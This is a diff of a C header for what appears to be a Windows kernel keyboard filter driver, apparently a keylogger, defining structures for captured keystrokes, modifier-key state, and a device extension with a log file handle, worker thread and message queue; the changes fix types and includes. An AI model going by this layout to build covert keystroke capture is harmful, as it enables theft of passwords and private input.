@@ -1,29 +1,34 @@
 #ifndef _COMMON_H
 #define _COMMON_H
-#include <winddk.h>
-
+extern "C"{
+#include <ntddk.h>
+}
+#include <ntddkbd.h>
 typedef struct _KEY_DATA
 {
 	LIST_ENTRY ListEntry;
 	char KeyData;
 	char KeyFlags;
-}KEY_DATA, PKEY_DATA;
+}KEY_DATA, *PKEY_DATA;
 
-typedef struct _KEY_STATE{
-	BOOL kSHIFT; //if the shift key is pressed 
-	BOOL kCAPSLOCK; //if the caps lock key is pressed down
-	BOOL kCTRL; //if the control key is pressed down
-	BOOL kALT; //if the alt key is pressed down
-}KEY_STATE, *PKEY_STATE;
+struct KEY_STATE 
+{
+	bool kSHIFT; //if the shift key is pressed 
+	bool kCAPSLOCK; //if the caps lock key is pressed down
+	bool kCTRL; //if the control key is pressed down
+	bool kALT; //if the alt key is pressed down
+};
 
 typedef struct _DEVICE_EXTENSION{
-	PDEVICE_OBJECT pKeyboarDevice;//保存attach后的设备
+	PDEVICE_OBJECT pKeyboardDevice;//保存attach后的设备
 	HANDLE hFile;
 	bool bThreadTerminate;
 	PETHREAD pThreadObj;
-	PRKSEMAPHORE sem;
+	KSEMAPHORE sem;
 	LIST_ENTRY MessageList;
-	KSPIN_LOCK pkLock;//insert taillist use
+	KSPIN_LOCK kLock;//insert taillist use
+	struct KEY_STATE kState;//scancode use
 }DEVICE_EXTENSION, *PDEVICE_EXTIONSION;
-long g_PendingWrite = 0;
+typedef PDEVICE_EXTIONSION PDEVICE_EXTENSION;
+
 #endif
